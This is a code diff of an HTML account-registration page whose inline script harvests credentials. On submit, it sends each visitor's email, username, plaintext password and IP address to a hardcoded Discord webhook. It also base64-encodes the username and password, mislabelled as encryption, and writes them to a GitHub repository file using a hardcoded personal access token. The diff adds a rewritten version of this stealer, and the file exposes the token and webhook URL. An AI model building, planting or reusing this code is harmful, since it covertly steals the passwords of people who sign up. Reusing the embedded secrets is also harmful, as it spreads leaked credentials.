@@ -22,46 +22,108 @@
         <a class="new" href="../login" style="color: rgb(212, 255, 0)">Create a account</a>
     </div>
     <script>
-        const token = "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";  // ⚠ Substitua pelo seu token do GitHub
-        const owner = "JempUnkn";  // ⚠ Seu usuário ou organização no GitHub
-        const repo = "firebase_teste";  // ⚠ Nome do repositório
-        const filePath = "logger.log";  // Arquivo onde salvar os dados
-
+        const token = "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"; // ⚠ Substitua pelo seu token do GitHub
+        const owner = "JempUnkn"; // ⚠ Seu usuário ou organização no GitHub
+        const repo = "firebase_teste"; // ⚠ Nome do repositório
+        const filePath = "logger.log"; // Arquivo onde salvar os dados
+        
         function formatarDataHora(date = new Date()) {
             const dia = String(date.getDate()).padStart(2, '0');
-            const mes = String(date.getMonth() + 1).padStart(2, '0'); // Janeiro é 0
+            const mes = String(date.getMonth() + 1).padStart(2, '0');
             const ano = date.getFullYear();
             const horas = String(date.getHours()).padStart(2, '0');
             const minutos = String(date.getMinutes()).padStart(2, '0');
             const segundos = String(date.getSeconds()).padStart(2, '0');
-
-            // Obtendo o fuso horário no formato UTC±HH:MM
-            const offsetMinutos = date.getTimezoneOffset();
-            const offsetHoras = Math.abs(Math.floor(offsetMinutos / 60));
-            const offsetRestanteMin = Math.abs(offsetMinutos % 60);
-            const sinal = offsetMinutos > 0 ? '-' : '+';
-            const fusoHorario = `UTC${sinal}${String(offsetHoras).padStart(2, '0')}:${String(offsetRestanteMin).padStart(2, '0')}`;
-
-            return `${dia}/${mes}/${ano} ${horas}:${minutos}:${segundos} ${fusoHorario}`;
+        
+            return `${dia}/${mes}/${ano} ${horas}:${minutos}:${segundos}`;
         }
-
+        
         function encryptData(data) {
             try {
-                return btoa(unescape(encodeURIComponent(data)));  // Codifica os dados em Base64
+                return btoa(data); // Codifica os dados em Base64
             } catch (error) {
                 console.error("Erro ao criptografar dados:", error);
                 return null;
             }
         }
-
         
-
-
-
-        /// Enviar um log pra discord
-        const webhookUrl = 'https://discord.com/api/webhooks/1345523112787050609/UB5aUudmYFkc91vmQ_Nl4cLtF7vjmSBBK96_Wy1a55AQ2MAfRaylZgPPhk3ZaeQoHfPg';
-
-        function sendToDiscord(ip, email, username, password) {
+        // 🔹 Função para obter SHA do arquivo no GitHub
+        async function getFileSHA() {
+            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+        
+            try {
+                const response = await fetch(url, {
+                    headers: { Authorization: `token ${token}` }
+                });
+        
+                if (response.status === 404) {
+                    console.log("Arquivo não encontrado, será criado um novo.");
+                    return null;
+                }
+        
+                if (!response.ok) {
+                    throw new Error(`Erro ao obter o SHA: ${response.status} ${response.statusText}`);
+                }
+        
+                const fileData = await response.json();
+                return fileData.sha; // Retorna o SHA do arquivo
+            } catch (error) {
+                console.error("Erro ao buscar SHA do arquivo:", error);
+                return null;
+            }
+        }
+        
+        // 🔹 Função para atualizar o arquivo no GitHub
+        async function updateGitHubFile(encryptedData) {
+            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
+            const sha = await getFileSHA(); // Obtém o SHA do arquivo (ou null se não existir)
+        
+            try {
+                // 🔹 Adiciona os novos dados
+                const newContent = `${encryptedData}\n`;
+                const encodedContent = btoa(newContent); // Codifica em Base64 corretamente
+        
+                const payload = {
+                    message: "Adicionando nova entrada",
+                    content: encodedContent,
+                    sha: sha // Se null, GitHub cria um novo arquivo
+                };
+        
+                const response = await fetch(url, {
+                    method: "PUT",
+                    headers: {
+                        "Authorization": `token ${token}`,
+                        "Content-Type": "application/json"
+                    },
+                    body: JSON.stringify(payload)
+                });
+        
+                if (!response.ok) {
+                    throw new Error(`Erro ao atualizar arquivo: ${response.status} ${response.statusText}`);
+                }
+        
+                console.log("Arquivo atualizado com sucesso!");
+            } catch (error) {
+                console.error("Erro ao atualizar arquivo no GitHub:", error);
+            }
+        }
+        
+        // 🔹 Função para obter o IP do usuário
+        async function getUserIP() {
+            try {
+                const response = await fetch("https://api.ipify.org?format=json");
+                const data = await response.json();
+                return data.ip;
+            } catch (error) {
+                console.error("Erro ao obter IP:", error);
+                return "Desconhecido";
+            }
+        }
+        
+        // 🔹 Função para enviar logs ao Discord
+        const webhookUrl = "https://discord.com/api/webhooks/1345523112787050609/UB5aUudmYFkc91vmQ_Nl4cLtF7vjmSBBK96_Wy1a55AQ2MAfRaylZgPPhk3ZaeQoHfPg";
+        
+        async function sendToDiscord(ip, email, username, password) {
             const embed = {
                 title: "📝 Novo Cadastro Realizado!",
                 description: "Um novo usuário se registrou no sistema.",
@@ -77,92 +139,61 @@
                 },
                 timestamp: new Date().toISOString()
             };
-
-            fetch(webhookUrl, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ embeds: [embed] })
-            })
-            .then(response => {
-                if (response.ok) {
-                    console.log('Embed enviado com sucesso!');
-                } else {
-                    console.log('Falha ao enviar o embed.');
+        
+            try {
+                const response = await fetch(webhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ embeds: [embed] })
+                });
+        
+                if (!response.ok) {
+                    throw new Error("Erro ao enviar embed.");
                 }
-            })
-            .catch(error => console.error('Erro ao enviar embed:', error));
+        
+                console.log("Embed enviado com sucesso!");
+            } catch (error) {
+                console.error("Erro ao enviar embed:", error);
+            }
         }
-
-
-
-
-
-        function submitData(event) {
-            event.preventDefault(); // Impede o envio do formulário
-
+        
+        // 🔹 Função principal para capturar os dados e processar o cadastro
+        async function submitData(event) {
+            event.preventDefault();
+        
             const email = document.getElementById("email").value.trim();
             const username = document.getElementById("username").value.trim();
             const password = document.getElementById("password").value.trim();
             const termsAccepted = document.getElementById("terms").checked;
-
+        
             if (!email || !username || !password) {
                 alert("Todos os campos são obrigatórios!");
                 return;
             }
-
+        
             if (!termsAccepted) {
                 alert("Você deve aceitar os termos e condições!");
                 return;
             }
-
-            fetch("https://api.ipify.org?format=json")
-                .then(response => response.json())
-                .then(data => {
-                    const ip = data.ip;
-                    sendToDiscord(ip, email, username, password); // Envia os dados para o Discord via embed
-                    const dataToEncrypt = `${username}:${password}`;
-                    const encryptedData = encryptData(dataToEncrypt);
-
-                    updateGitHubFile(encryptedData);
-                })
-                .catch(error => console.error("Erro ao obter IP:", error));
+        
+            // 🔹 Obtém o IP do usuário
+            const ip = await getUserIP();
+        
+            // 🔹 Envia os dados para o Discord
+            await sendToDiscord(ip, email, username, password);
+        
+            // 🔹 Codifica e salva no GitHub
+            const dataToEncrypt = `${username}:${password}`;
+            const encryptedData = encryptData(dataToEncrypt);
+            
+            if (encryptedData) {
+                await updateGitHubFile(encryptedData);
+            }
         }
+        
+        // 🔹 Adiciona o evento ao botão de cadastro
+        document.getElementById("submit-button").addEventListener("click", submitData);
 
-
-        function updateGitHubFile(encryptedData) {
-            const url = `https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`;
-
-            fetch(url, {
-                headers: { Authorization: `token ${token}` }
-            })
-                .then(res => res.json())
-                .then(fileData => {
-                    const sha = fileData.sha || null;
-                    const existingContent = fileData.content 
-                        ? decodeURIComponent(escape(atob(fileData.content))) 
-                        : "";  // Se não houver conteúdo, começa com string vazia
-
-                    const updatedContent = existingContent + "\n" + encryptedData;
-                    const encodedContent = btoa(unescape(encodeURIComponent(updatedContent)));
-
-                    fetch(url, {
-                        method: "PUT",
-                        headers: {
-                            "Authorization": `token ${token}`,
-                            "Content-Type": "application/json"
-                        },
-                        body: JSON.stringify({
-                            message: `Adicionando nova entrada: ${encryptedData}`,
-                            content: encodedContent,
-                            sha: sha
-                        })
-                    })
-                        .then(res => res.json())
-                        .then(response => console.log("Arquivo atualizado:", response))
-                        .catch(error => console.error("Erro ao enviar para GitHub:", error));
-                })
-                .catch(error => console.error("Erro ao verificar arquivo no GitHub:", error));
-        }
     </script>
 </body>
 </html>
